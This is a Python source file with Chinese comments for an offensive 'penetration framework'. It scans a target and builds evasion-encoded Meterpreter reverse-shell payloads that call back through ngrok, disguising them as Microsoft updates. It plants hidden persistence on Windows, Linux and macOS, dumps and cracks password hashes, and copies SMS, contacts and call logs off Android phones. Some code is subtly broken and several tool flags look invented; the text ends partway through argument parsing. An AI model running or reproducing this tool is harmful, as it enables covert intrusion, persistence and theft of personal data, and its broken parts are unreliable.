#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import subprocess
import time
import argparse
import xml.etree.ElementTree as ET
import json
import socket
import random
import base64
import platform
import requests
import re
import hashlib
import shutil
import tempfile
import binascii
import string
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init
from tqdm import tqdm

# 初始化颜色输出
init()

class AdvancedPenetrationFramework:
    def __init__(self, target, output_dir="pentest_results", ngrok_auth_token=None, 
                 evasion_level=5, proxy=None, stealth_mode=True, time_estimate=True):
        # 初始化配置
        self.config = self.initialize_config(ngrok_auth_token, evasion_level, proxy, stealth_mode, time_estimate)
        self.target = target
        self.output_dir = output_dir
        self.session_id = f"{random.randint(100000,999999)}"
        self.timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.executor = ThreadPoolExecutor(max_workers=20)
        self.vulnerabilities = []
        self.successful_exploits = 0
        self.active_sessions = {}
        self.progress = {}
        self.total_tasks = 0
        self.completed_tasks = 0
        self.temp_dir = tempfile.mkdtemp(prefix="pentest_")
        
        self.init_environment()
        self.init_logging()
        
        if self.config["NGROK_AUTH_TOKEN"]:
            self.setup_ngrok()

    def initialize_config(self, ngrok_auth_token, evasion_level, proxy, stealth_mode, time_estimate):
        """初始化配置参数"""
        return {
            "LHOST": self.get_obfuscated_ip(),
            "PUBLIC_IP": None,
            "NGROK_AUTH_TOKEN": ngrok_auth_token,
            "PORTS": self.generate_random_ports(),
            "ENCRYPTION": self.generate_encryption_keys(),
            "SLEEP_INTERVAL": random.randint(30, 120),
            "MIGRATION": self.get_migration_processes(),
            "EVASION_LEVEL": evasion_level,
            "STEALTH_MODE": stealth_mode,
            "NGROK_TUNNELS": {},
            "PROXY": proxy,
            "ANTIVIRUS_EVASION": True,
            "PERSISTENCE_METHODS": {
                "windows": 3, "linux": 3, "macos": 2, "android": 2
            },
            "SESSION_ENCRYPTION": True,
            "TIME_ESTIMATE": time_estimate,
            "WAF_BYPASS": True,
            "FIREWALL_EVASION": True
        }

    # --------------------------
    # 基础工具函数
    # --------------------------
    def get_obfuscated_ip(self):
        """获取混淆后的本地IP"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            if self.config["STEALTH_MODE"]:
                parts = ip.split('.')
                return f"{parts[0]}.{int(parts[1])+1}.{parts[2]}.{int(parts[3])-1}"
            return ip
        except:
            return "127.0.0.1"

    def generate_random_ports(self):
        """生成随机端口"""
        return {
            "windows": random.randint(10000, 20000),
            "linux": random.randint(20001, 30000),
            "android": random.randint(30001, 40000),
            "macos": random.randint(40001, 50000),
            "web": random.randint(50001, 60000)
        }

    def generate_encryption_keys(self):
        """生成加密密钥"""
        return {
            "windows": self.generate_encryption_key(32),
            "linux": self.generate_encryption_key(24),
            "android": self.generate_encryption_key(16),
            "macos": self.generate_encryption_key(32)
        }

    def generate_encryption_key(self, length):
        """生成随机加密密钥"""
        chars = string.ascii_letters + string.digits + "!@#$%^&*()"
        return ''.join(random.SystemRandom().choice(chars) for _ in range(length))

    def get_migration_processes(self):
        """获取各平台迁移进程"""
        return {
            "windows": self.get_random_windows_process(),
            "linux": self.get_random_linux_process(),
            "android": "com.android.systemui",
            "macos": self.get_random_macos_process()
        }

    def get_random_windows_process(self):
        """随机Windows进程"""
        processes = ["explorer.exe", "svchost.exe", "winlogon.exe", "csrss.exe", "lsass.exe"]
        return random.choice(processes)

    def get_random_linux_process(self):
        """随机Linux进程"""
        processes = ["systemd", "sshd", "dbus-daemon", "NetworkManager", "cron"]
        return random.choice(processes)

    def get_random_macos_process(self):
        """随机MacOS进程"""
        processes = ["WindowServer", "launchd", "kernel_task", "mDNSResponder", "cfprefsd"]
        return random.choice(processes)

    def generate_random_filename(self, length=12, extension=None):
        """生成随机文件名"""
        chars = string.ascii_lowercase + string.digits
        name = ''.join(random.choice(chars) for _ in range(length))
        return f"{name}.{extension}" if extension else name

    # --------------------------
    # 环境初始化
    # --------------------------
    def init_environment(self):
        """初始化测试环境"""
        required_dirs = [
            "recon", "scanning", "exploitation", "post_exploit", 
            "payloads", "loot", "web", "android", 
            "windows", "linux", "macos", "logs", 
            "screenshots", "reports"
        ]
        
        for dir_name in required_dirs:
            dir_path = os.path.join(self.output_dir, dir_name)
            os.makedirs(dir_path, exist_ok=True)

    def init_logging(self):
        """初始化日志系统"""
        self.log_file = os.path.join(self.output_dir, "logs", "pentest.log")
        with open(self.log_file, "a") as f:
            f.write(f"\n\n=== 测试会话开始 {self.timestamp} ===\n")
            f.write(f"目标: {self.target}\n")
            f.write(f"本地IP: {self.config['LHOST']}\n")
            f.write(f"会话ID: {self.session_id}\n")

    def log(self, message, level="INFO"):
        """记录日志"""
        colors = {
            "INFO": Fore.BLUE, "SUCCESS": Fore.GREEN, 
            "WARNING": Fore.YELLOW, "ERROR": Fore.RED, 
            "VULN": Fore.MAGENTA
        }
        color = colors.get(level, Fore.WHITE)
        
        if self.config["STEALTH_MODE"]:
            message = re.sub(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', '[REDACTED]', message)
        
        log_entry = f"[{datetime.now()}] [{level}] {message}"
        print(f"{color}{log_entry}{Style.RESET_ALL}")
        with open(self.log_file, "a") as f:
            f.write(f"{log_entry}\n")

    # --------------------------
    # 网络通信模块
    # --------------------------
    def setup_ngrok(self):
        """设置Ngrok隧道"""
        self.log("正在设置Ngrok隧道...", "INFO")
        try:
            if not shutil.which("ngrok"):
                self.install_ngrok()
            
            # 配置认证
            auth_cmd = f"ngrok config add-authtoken {self.config['NGROK_AUTH_TOKEN']}"
            self.run_command(auth_cmd, save_output=False)
            
            # 启动隧道
            for os_type, port in self.config["PORTS"].items():
                if os_type != "web":
                    self.start_ngrok_tunnel(os_type, port)
            
            if self.config["NGROK_TUNNELS"]:
                self.config["PUBLIC_IP"] = next(iter(self.config["NGROK_TUNNELS"].values()))["public_host"]
            
        except Exception as e:
            self.log(f"Ngrok设置失败: {str(e)}", "ERROR")

    def install_ngrok(self):
        """安装Ngrok"""
        cmds = [
            "curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null",
            "echo \"deb https://ngrok-agent.s3.amazonaws.com buster main\" | sudo tee /etc/apt/sources.list.d/ngrok.list",
            "sudo apt update -qq",
            "sudo apt install -y ngrok"
        ]
        for cmd in cmds:
            self.run_command(cmd, save_output=False)

    def start_ngrok_tunnel(self, os_type, port):
        """启动单个Ngrok隧道"""
        region = random.choice(["us", "eu", "ap", "au"])
        log_file = os.path.join(self.temp_dir, f"ngrok_{os_type}.log")
        
        cmd = (
            f"tmux new-session -d -s ngrok_{os_type} "
            f"'ngrok tcp {port} --region={region} --log=stdout > {log_file}'"
        )
        self.run_command(cmd, save_output=False)
        time.sleep(5)
        
        tunnel_info = self.get_ngrok_tunnel_info(port)
        if tunnel_info:
            self.config["NGROK_TUNNELS"][os_type] = tunnel_info
            self.log(f"{os_type}隧道建立成功: {tunnel_info['public_url']}", "SUCCESS")

    def get_ngrok_tunnel_info(self, port, retries=3):
        """获取Ngrok隧道信息"""
        for _ in range(retries):
            try:
                resp = requests.get("http://localhost:4040/api/tunnels", timeout=5)
                if resp.status_code == 200:
                    tunnels = resp.json().get("tunnels", [])
                    for tunnel in tunnels:
                        if str(port) in tunnel["config"]["addr"]:
                            public_url = tunnel["public_url"]
                            host = public_url.split("//")[1].split(":")[0]
                            port_num = public_url.split(":")[2]
                            return {
                                "public_url": public_url,
                                "public_host": host,
                                "public_port": port_num
                            }
                time.sleep(2)
            except Exception:
                time.sleep(2)
        return None

    # --------------------------
    # 命令执行模块
    # --------------------------
    def run_command(self, cmd, category="scanning", filename=None, timeout=900, save_output=True):
        """执行命令并记录结果"""
        try:
            self.log(f"执行命令: {cmd}")
            
            # 命令混淆
            if self.config["EVASION_LEVEL"] > 1:
                cmd = self.obfuscate_command(cmd)
            
            result = subprocess.run(
                cmd, shell=True, check=True,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                text=True, timeout=timeout
            )
            
            if save_output:
                output = self.format_command_output(cmd, result)
                filename = filename or f"{cmd.split()[0]}_{self.timestamp}.txt"
                filename = re.sub(r'[^\w\-_.]', '_', filename)[:100]
                
                output_path = os.path.join(self.output_dir, category, filename)
                with open(output_path, "w") as f:
                    f.write(output)
                
                self.log(f"结果保存到: {output_path}", "SUCCESS")
            return result.stdout
        
        except subprocess.TimeoutExpired:
            self.log(f"命令超时: {cmd}", "WARNING")
            return None
        except subprocess.CalledProcessError as e:
            error_msg = f"命令失败: {e}\n错误输出:\n{e.stderr}"
            self.log(error_msg, "ERROR")
            return None
        except Exception as e:
            self.log(f"执行命令异常: {str(e)}", "ERROR")
            return None

    def format_command_output(self, cmd, result):
        """格式化命令输出"""
        output = f"命令: {cmd}\n输出:\n{result.stdout}"
        if result.stderr:
            output += f"\n错误:\n{result.stderr}"
        return output

    def obfuscate_command(self, cmd):
        """混淆命令"""
        if self.config["EVASION_LEVEL"] == 2:
            parts = cmd.split()
            if len(parts) > 3:
                var_name = f"cmd{random.randint(1,9)}"
                return f"{var_name}=\"{parts[0]}\"; ${var_name} {' '.join(parts[1:])}"
        elif self.config["EVASION_LEVEL"] >= 3:
            encoded_cmd = base64.b64encode(cmd.encode()).decode()
            return f"echo {encoded_cmd} | base64 -d | bash"
        return cmd

    # --------------------------
    # 扫描与漏洞检测模块
    # --------------------------
    def scan_target(self):
        """主扫描方法"""
        self.start_time = time.time()
        self.total_tasks = 15
        
        try:
            # Nmap扫描
            self.run_nmap_scan()
            self.update_progress("Nmap扫描", 100)
            
            # 解析结果
            self.parse_nmap_results(f"{self.output_dir}/scanning/nmap_full.xml")
            self.update_progress("结果解析", 100)
            
            # 识别服务
            self.identify_services()
            self.update_progress("服务识别", 100)
            
            # 动态调整任务数
            open_ports = len(self.vulnerabilities)
            self.total_tasks += open_ports * 2
            
            # 漏洞利用
            for vuln in self.vulnerabilities:
                if vuln["criticality"] == "high":
                    self.exploit_vulnerability(vuln["port"], vuln["service"], vuln["version"])
                    self.update_progress(f"{vuln['service']}漏洞利用", 100)
            
            # 持久化部署
            if self.active_sessions:
                for os_type in self.active_sessions.keys():
                    self.deploy_persistence(os_type)
                    self.update_progress(f"{os_type}持久化", 100)
            
            # 后渗透操作
            self.post_exploitation()
            
        except Exception as e:
            self.log(f"扫描过程中出错: {str(e)}", "ERROR")
        finally:
            self.generate_report()
            self.update_progress("报告生成", 100)

    def run_nmap_scan(self):
        """执行Nmap扫描"""
        nmap_cmd = self.evade_firewall(
            f"nmap -sS -sV -sC -O -A -p- -T4 --script vuln "
            f"-oX {self.output_dir}/scanning/nmap_full.xml {self.target}"
        )
        self.run_command(nmap_cmd, category="scanning", filename="nmap_full.txt")

    def parse_nmap_results(self, xml_file):
        """解析Nmap结果"""
        try:
            tree = ET.parse(xml_file)
            root = tree.getroot()
            
            for host in root.findall("host"):
                for port in host.findall("ports/port"):
                    if port.find("state").get("state") == "open":
                        port_num = port.get("portid")
                        service = port.find("service").get("name", "unknown")
                        product = port.find("service").get("product", "")
                        version = port.find("service").get("version", "")
                        
                        self.log(f"发现开放端口: {port_num}/{service} {product} {version}", "INFO")
                        
                        for script in port.findall("script"):
                            if "vuln" in script.get("id", ""):
                                output = script.get("output", "")
                                criticality = "high" if "VULNERABLE" in output else "medium"
                                self.log_vulnerability(
                                    script.get("id"),
                                    output,
                                    criticality,
                                    port_num,
                                    service,
                                    version
                                )
        except Exception as e:
            self.log(f"解析Nmap结果失败: {str(e)}", "ERROR")

    def log_vulnerability(self, vuln_type, details, criticality, port, service, version):
        """记录漏洞"""
        vuln = {
            "type": vuln_type,
            "details": details,
            "criticality": criticality,
            "port": port,
            "service": service,
            "version": version,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "target": self.target
        }
        self.vulnerabilities.append(vuln)
        
        vuln_file = os.path.join(self.output_dir, "reports", "vulnerabilities.json")
        with open(vuln_file, "w") as f:
            json.dump(self.vulnerabilities, f, indent=2)
        
        self.log(f"发现漏洞: {vuln_type} (严重性: {criticality})", "VULN")

    def identify_services(self):
        """识别服务"""
        web_ports = []
        if os.path.exists(f"{self.output_dir}/scanning/nmap_full.xml"):
            tree = ET.parse(f"{self.output_dir}/scanning/nmap_full.xml")
            for port in tree.findall(".//port"):
                service = port.find("service").get("name", "")
                portid = port.get("portid")
                
                if service in ["http", "https"]:
                    web_ports.append(portid)
                elif service == "ms-wbt-server":
                    self.enable_rdp()
        
        if web_ports:
            self.test_web_services(web_ports)

    # --------------------------
    # 漏洞利用模块
    # --------------------------
    def exploit_vulnerability(self, port, service, version):
        """利用漏洞"""
        exploit_func = {
            "http": self.exploit_web_service,
            "https": self.exploit_web_service,
            "smb": self.exploit_smb_service,
            "ftp": self.exploit_ftp_service,
            "ssh": self.exploit_ssh_service,
            "ms-wbt-server": self.enable_rdp
        }.get(service.lower(), None)
        
        if exploit_func:
            return exploit_func(port)
        return False

    def exploit_web_service(self, port):
        """利用Web服务漏洞"""
        protocol = "https" if port == "443" else "http"
        base_url = f"{protocol}://{self.target}:{port}"
        
        if self.config["WAF_BYPASS"] and self.detect_waf(base_url):
            base_url = self.bypass_waf(base_url)
        
        exploits = [
            f"sqlmap -u '{base_url}/' --level=5 --risk=3 --random-agent --batch --output-dir={self.output_dir}/exploitation/sqlmap_{port}",
            f"nikto -h {base_url} -output {self.output_dir}/exploitation/nikto_{port}.html",
            f"gobuster dir -u {base_url} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o {self.output_dir}/exploitation/gobuster_{port}.txt"
        ]
        
        success = False
        for exploit in exploits:
            result = self.run_command(exploit, category="exploitation")
            if result and "vulnerable" in str(result).lower():
                success = True
        
        return success

    def detect_waf(self, url):
        """检测WAF"""
        cmd = f"wafw00f {url} -o {self.output_dir}/web/waf_detection.json"
        result = self.run_command(cmd, category="web")
        return "is behind a WAF" in str(result)

    def bypass_waf(self, url):
        """绕过WAF"""
        techniques = [
            lambda u: u.replace(" ", "/**/"),
            lambda u: u.replace("=", " LIKE "),
            lambda u: u + "/*" + "A"*random.randint(10,50) + "*/"
        ]
        
        for tech in random.sample(techniques, 2):
            url = tech(url)
        return url

    def evade_firewall(self, cmd):
        """防火墙规避"""
        if not self.config["FIREWALL_EVASION"]:
            return cmd
            
        evasion_techs = [
            lambda c: re.sub(r"(\d{4,5})", str(int(r.group(1)) + random.randint(-10,10)), c),
            lambda c: c + " --dns-server 8.8.8.8" if "nmap" in c else c,
            lambda c: c.replace("-sS", "-sA") if "nmap" in c else c
        ]
        
        for tech in random.sample(evasion_techs, 2):
            cmd = tech(cmd)
        return cmd

    def enable_rdp(self):
        """启用RDP"""
        cmds = [
            "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
            "netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes",
            "net user administrator /active:yes",
            f"net user administrator {self.generate_encryption_key(12)}"
        ]
        
        for cmd in cmds:
            result = self.execute_meterpreter(["shell", cmd, "exit"])
            if "successfully" in str(result).lower():
                self.log("RDP服务已启用", "SUCCESS")
                return True
        return False

    # --------------------------
    # Payload生成模块
    # --------------------------
    def generate_payload(self, target_os):
        """生成Payload"""
        payload_name = self.generate_random_filename(extension={
            "windows": "exe",
            "linux": "elf",
            "macos": "macho",
            "android": "apk"
        }[target_os])
        
        payload_path = os.path.join(self.temp_dir, payload_name)
        lhost, lport = self.get_payload_connection_info(target_os)
        
        cmd = self.build_payload_command(target_os, lhost, lport, payload_path)
        result = self.run_command(cmd, category="payloads", 
                                 filename=f"{target_os}_payload_gen.txt",
                                 timeout=600)
        
        if result and os.path.exists(payload_path):
            self.enhance_payload(target_os, payload_path)
            output_path = os.path.join(self.output_dir, "payloads", payload_name)
            shutil.copy(payload_path, output_path)
            return output_path
        return None

    def build_payload_command(self, target_os, lhost, lport, payload_path):
        """构建Payload生成命令"""
        base_cmd = {
            "windows": (
                f"msfvenom -p windows/x64/meterpreter/reverse_https "
                f"LHOST={lhost} LPORT={lport} "
                f"PayloadUUIDTracking=true PayloadUUIDName=UpdateService "
                f"-e x64/zutto_dekiru -i {random.randint(8,12)} "
                f"{self.get_evasion_parameters(target_os)} "
                f"-f exe -o {payload_path}"
            ),
            "linux": (
                f"msfvenom -p linux/x86/meterpreter/reverse_tcp "
                f"LHOST={lhost} LPORT={lport} "
                f"PrependChrootBreak=true PrependSetuid=true "
                f"{self.get_evasion_parameters(target_os)} -f elf -o {payload_path}"
            ),
            "macos": (
                f"msfvenom -p osx/x64/meterpreter/reverse_https "
                f"LHOST={lhost} LPORT={lport} "
                f"PayloadUUIDTracking=true PayloadUUIDName=UpdateService "
                f"ENCODER=cmd/opcode_sub -e cmd/opcode_sub "
                f"{self.get_evasion_parameters(target_os)} -f macho -o {payload_path}"
            ),
            "android": (
                f"msfvenom -p android/meterpreter/reverse_https "
                f"LHOST={lhost} LPORT={lport} "
                f"PayloadUUIDTracking=true PayloadUUIDName=UpdateService "
                f"{self.get_evasion_parameters(target_os)} -o {payload_path}"
            )
        }
        return base_cmd[target_os]

    def enhance_payload(self, target_os, payload_path):
        """增强Payload"""
        if target_os == "windows":
            self.enhance_windows_payload(payload_path)
        elif target_os == "macos":
            self.enhance_macos_payload(payload_path)

    def enhance_windows_payload(self, payload_path):
        """增强Windows Payload"""
        try:
            self.run_command(f"signify -S -s {self.get_fake_cert()} -m {payload_path} -x {payload_path}.signed", 
                             save_output=False)
            if os.path.exists(f"{payload_path}.signed"):
                os.replace(f"{payload_path}.signed", payload_path)
            
            self.run_command(f"resedit -a {payload_path} -i {self.get_random_icon()} -n \"Microsoft Update\"", 
                             save_output=False)
        except Exception as e:
            self.log(f"Windows Payload增强失败: {str(e)}", "WARNING")

    def enhance_macos_payload(self, payload_path):
        """增强MacOS Payload"""
        try:
            self.run_command(f"codesign -f -s 'Apple Development' {payload_path}", 
                             save_output=False)
            self.run_command(f"SetFile -a E {payload_path}", save_output=False)
        except Exception as e:
            self.log(f"MacOS Payload增强失败: {str(e)}", "WARNING")

    def get_payload_connection_info(self, target_os):
        """获取Payload连接信息"""
        if self.config["NGROK_TUNNELS"].get(target_os):
            tunnel = self.config["NGROK_TUNNELS"][target_os]
            return tunnel["public_host"], tunnel["public_port"]
        return self.config["LHOST"], self.config["PORTS"][target_os]

    def get_evasion_parameters(self, target_os):
        """获取免杀参数"""
        params = "--encrypt aes256 --smallest "
        if self.config["EVASION_LEVEL"] >= 3:
            params += "--sandbox-evasion --avoid-threaded "
        if self.config["EVASION_LEVEL"] >= 4:
            params += "--obfuscate-vars --obfuscate-methods "
        if self.config["EVASION_LEVEL"] >= 5:
            params += "--disable-exception-chain-validation "
        if self.config["STEALTH_MODE"]:
            params += "--no-append-exit --no-append-encode --prepend-migrate "
        return params

    # --------------------------
    # 持久化模块
    # --------------------------
    def deploy_persistence(self, target_os):
        """部署持久化"""
        payload_path = self.generate_payload(target_os)
        if not payload_path:
            return False
            
        try:
            if target_os == "windows":
                return self.deploy_windows_persistence(payload_path)
            elif target_os == "linux":
                return self.deploy_linux_persistence(payload_path)
            elif target_os == "macos":
                return self.deploy_macos_persistence(payload_path)
            elif target_os == "android":
                return self.deploy_android_persistence(payload_path)
        except Exception as e:
            self.log(f"持久化部署失败: {str(e)}", "ERROR")
            return False

    def deploy_windows_persistence(self, payload_path):
        """Windows持久化"""
        script = self.generate_windows_persistence_script(payload_path)
        script_path = os.path.join(self.temp_dir, "persistence.ps1")
        
        with open(script_path, "w") as f:
            f.write(script)
        
        self.encrypt_file(script_path)
        
        cmds = [
            f"upload {payload_path} C:\\\\Windows\\\\Temp\\\\{os.path.basename(payload_path)}",
            f"upload {script_path} C:\\\\Windows\\\\Temp\\\\persistence.enc",
            "shell",
            "powershell -ExecutionPolicy Bypass -Command \"[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Get-Content 'C:\\Windows\\Temp\\persistence.enc'))) | Invoke-Expression\"",
            "del C:\\Windows\\Temp\\persistence.enc",
            "exit"
        ]
        
        return self.execute_meterpreter(cmds)

    def generate_windows_persistence_script(self, payload_path):
        """生成Windows持久化脚本"""
        return f"""
# 注册表自启动
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate" /t REG_SZ /d "C:\\Windows\\Temp\\{os.path.basename(payload_path)}" /f

# 计划任务
schtasks /create /tn "Microsoft\\Windows\\WindowsUpdate" /tr "C:\\Windows\\Temp\\{os.path.basename(payload_path)}" /sc onstart /ru SYSTEM

# 服务持久化
sc create "WindowsUpdateService" binPath= "C:\\Windows\\Temp\\{os.path.basename(payload_path)}" start= auto
sc start "WindowsUpdateService"

# 隐藏文件
attrib +h +s "C:\\Windows\\Temp\\{os.path.basename(payload_path)}"
"""

    def deploy_linux_persistence(self, payload_path):
        """Linux持久化"""
        script = self.generate_linux_persistence_script(payload_path)
        script_path = os.path.join(self.temp_dir, "persistence.sh")
        
        with open(script_path, "w") as f:
            f.write(script)
        
        self.encrypt_file(script_path)
        
        cmds = [
            f"upload {payload_path} /tmp/{os.path.basename(payload_path)}",
            f"upload {script_path} /tmp/persistence.enc",
            "shell",
            "base64 -d /tmp/persistence.enc | sh",
            "rm -f /tmp/persistence.enc",
            "exit"
        ]
        
        return self.execute_meterpreter(cmds)

    def generate_linux_persistence_script(self, payload_path):
        """生成Linux持久化脚本"""
        return f"""#!/bin/bash
# 复制payload
cp {payload_path} /tmp/.systemd-{random.randint(1000,9999)}
chmod +x /tmp/.systemd-*

# cron持久化
(crontab -l 2>/dev/null; echo "@reboot /tmp/.systemd-*") | crontab -

# profile持久化
echo "/tmp/.systemd-* &" >> ~/.bashrc
echo "/tmp/.systemd-* &" >> ~/.profile
echo "/tmp/.systemd-* &" >> /etc/profile

# 隐藏进程
mv /tmp/.systemd-* /tmp/... && ln -s /tmp/... /tmp/.systemd-*
"""

    def deploy_macos_persistence(self, payload_path):
        """MacOS持久化"""
        script = self.generate_macos_persistence_script(payload_path)
        script_path = os.path.join(self.temp_dir, "persistence.sh")
        
        with open(script_path, "w") as f:
            f.write(script)
        
        self.encrypt_file(script_path)
        
        cmds = [
            f"upload {payload_path} /tmp/{os.path.basename(payload_path)}",
            f"upload {script_path} /tmp/persistence.enc",
            "shell",
            "base64 -d /tmp/persistence.enc | sh",
            "rm -f /tmp/persistence.enc",
            "exit"
        ]
        
        return self.execute_meterpreter(cmds)

    def generate_macos_persistence_script(self, payload_path):
        """生成MacOS持久化脚本"""
        return f"""#!/bin/bash
# LaunchAgent持久化
mkdir -p ~/Library/LaunchAgents
cat > ~/Library/LaunchAgents/com.apple.update.plist << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>/tmp/{os.path.basename(payload_path)}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
EOF

# 加载LaunchAgent
launchctl load ~/Library/LaunchAgents/com.apple.update.plist

# 隐藏文件
mv /tmp/{os.path.basename(payload_path)} /tmp/..{random.randint(100,999)}
"""

    def deploy_android_persistence(self, payload_path):
        """Android持久化"""
        cmds = [
            f"adb connect {self.target}:5555",
            f"adb install {payload_path}",
            "adb shell am startservice com.metasploit.stage/.MainService",
            "adb shell pm hide com.metasploit.stage"
        ]
        
        for cmd in cmds:
            self.run_command(cmd, category="android", filename="persistence.txt")
        return True

    # --------------------------
    # 后渗透模块
    # --------------------------
    def post_exploitation(self):
        """后渗透操作"""
        if "windows" in self.active_sessions:
            self.extract_and_crack_passwords()
            self.update_progress("密码破解", 100)
            
        if "linux" in self.active_sessions:
            self.check_linux_persistence()
            self.update_progress("Linux持久化检查", 100)
            
        if "android" in self.active_sessions:
            self.enhance_android_exploitation()
            self.update_progress("Android数据提取", 100)

    def extract_and_crack_passwords(self):
        """提取并破解密码"""
        hash_file = os.path.join(self.output_dir, "loot", "windows_hashes.txt")
        cmds = [
            "run post/windows/gather/hashdump",
            f"loot -f {hash_file}"
        ]
        
        if self.execute_meterpreter(cmds) and os.path.exists(hash_file):
            wordlist = "/usr/share/wordlists/rockyou.txt"
            output_file = os.path.join(self.output_dir, "loot", "cracked_passwords.txt")
            
            cmd = f"john --format=NT {hash_file} --wordlist={wordlist} --fork=4 > {output_file}"
            self.run_command(cmd, category="post_exploit", filename="password_cracking.txt")

    def check_linux_persistence(self):
        """检查Linux持久化"""
        check_cmds = [
            "crontab -l",
            "ls -la /etc/systemd/system/",
            "grep -r \"bash -c\" /etc/"
        ]
        
        for cmd in check_cmds:
            result = self.execute_meterpreter(["shell", cmd, "exit"])
            if result and ("http" in result or "curl" in result):
                self.log(f"发现持久化痕迹: {cmd}", "VULN")

    def enhance_android_exploitation(self):
        """增强Android利用"""
        data_types = {
            "sms": "content query --uri content://sms/inbox",
            "contacts": "content query --uri content://contacts/people",
            "call_logs": "content query --uri content://call_log/calls"
        }
        
        for name, cmd in data_types.items():
            output_file = os.path.join(self.output_dir, "android", f"{name}.txt")
            self.run_command(f"adb shell {cmd} > {output_file}", category="android")

    # --------------------------
    # Meterpreter交互模块
    # --------------------------
    def execute_meterpreter(self, commands):
        """执行Meterpreter命令"""
        script_file = os.path.join(self.temp_dir, f"meterpreter_{self.timestamp}.rc")
        with open(script_file, "w") as f:
            for cmd in commands:
                f.write(f"{cmd}\n")
        
        result = self.run_command(
            f"msfconsole -q -x 'resource {script_file}'",
            category="exploitation",
            filename="meterpreter_cmds.txt"
        )
        return result

    # --------------------------
    # 进度跟踪模块
    # --------------------------
    def update_progress(self, task_name, progress):
        """更新进度"""
        self.progress[task_name] = progress
        self.completed_tasks += 1
        self.display_progress()

    def display_progress(self):
        """显示进度"""
        if not self.config["TIME_ESTIMATE"]:
            return
            
        completed = self.completed_tasks
        total = self.total_tasks
        if total == 0:
            return
            
        elapsed = time.time() - self.start_time
        avg_time = elapsed / completed if completed > 0 else 0
        remaining = avg_time * (total - completed)
        
        with tqdm(total=total, desc="整体进度", unit="任务") as pbar:
            pbar.update(completed)
            pbar.set_postfix({
                "已用时间": f"{elapsed:.1f}s",
                "预计剩余": f"{remaining:.1f}s" if remaining > 0 else "计算中..."
            })

    # --------------------------
    # 报告生成模块
    # --------------------------
    def generate_report(self):
        """生成报告"""
        try:
            report_content = self.generate_report_content()
            report_path = os.path.join(self.output_dir, "reports", "final_report.md")
            
            with open(report_path, "w") as f:
                f.write(report_content)
            
            if self.config["SESSION_ENCRYPTION"]:
                self.encrypt_file(report_path)
                report_path += ".enc"
            
            self.log(f"报告已生成: {report_path}", "SUCCESS")
            return True
        except Exception as e:
            self.log(f"报告生成失败: {str(e)}", "ERROR")
            return False

    def generate_report_content(self):
        """生成报告内容"""
        return f"""
# 渗透测试报告 - 终极版

## 测试概况
- 目标: {self.target}
- 日期: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
- 逃逸级别: {self.config['EVASION_LEVEL']}
- 发现漏洞: {len(self.vulnerabilities)}个

## 后门控制指南

### Windows控制
1. 连接会话: sessions -i [ID]
2. 常用命令:
   - getsystem: 提权
   - hashdump: 提取密码哈希
   - screenshot: 截屏

### Linux控制
1. 检查持久化: crontab -l
2. 文件下载: download /path/file

### 安全建议
1. 立即修补高危漏洞
2. 重置所有凭据
3. 审查持久化位置
"""

    def encrypt_file(self, file_path):
        """加密文件"""
        try:
            with open(file_path, "r") as f:
                content = f.read()
            encrypted = base64.b64encode(content.encode()).decode()
            with open(file_path, "w") as f:
                f.write(encrypted)
            return True
        except:
            return False

    # --------------------------
    # 清理模块
    # --------------------------
    def __del__(self):
        """安全清理"""
        if os.path.exists(self.temp_dir):
            shutil.rmtree(self.temp_dir, ignore_errors=True)

# --------------------------
# 主程序
# --------------------------
def print_banner():
    banner = f"""
{Fore.RED}
██████╗ ███████╗██████╗ ███████╗████████╗███████╗██████╗ 
██╔══██╗██╔════╝██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
██████╔╝█████╗  ██████╔╝███████╗   ██║   █████╗  ██████╔╝
██╔═══╝ ██╔══╝  ██╔══██╗╚════██║   ██║   ██╔══╝  ██╔══██╗
██║     ███████╗██║  ██║███████║   ██║   ███████╗██║  ██║
╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
{Style.RESET_ALL}
{Fore.YELLOW}终极渗透测试框架 v9.0 | 企业增强版{Style.RESET_ALL}
{Fore.CYAN}仅用于合法授权的安全测试{Style.RESET_ALL}
"""
    print(banner)

def main():
    print_banner()
    
    parser = argparse.ArgumentParser(description="终极渗透测试框架 - 企业增强版")
    parser.add_argument("target", help="目标IP地址或域名")
    parser.add_argument("-o", "--output", help="输出目录", default="pentest_results")
    parser.add_argument("--ngrok-token", help="Ngrok认证令牌", default=None)
    parser.add_argument("--evasion", help="逃逸技术级别 (1-5)", type=int, choices=range(1,6), default=5)
    parser.add_argument("--proxy", help="使用代理 (格式: http://proxy:port)", default=None)
    parser.add_argument("--stealth", help="启用隐身模式", action="store_true")
    parser.add_argument("--no-progress", help="禁用进度显示", action="store_false", dest="time_estimate")
    parser.add_argument("--windows", help="执行Windows渗透测试", action="store_true")
    parser.add_argument("--linux", help="执行Linux渗透测试", action="store_true")
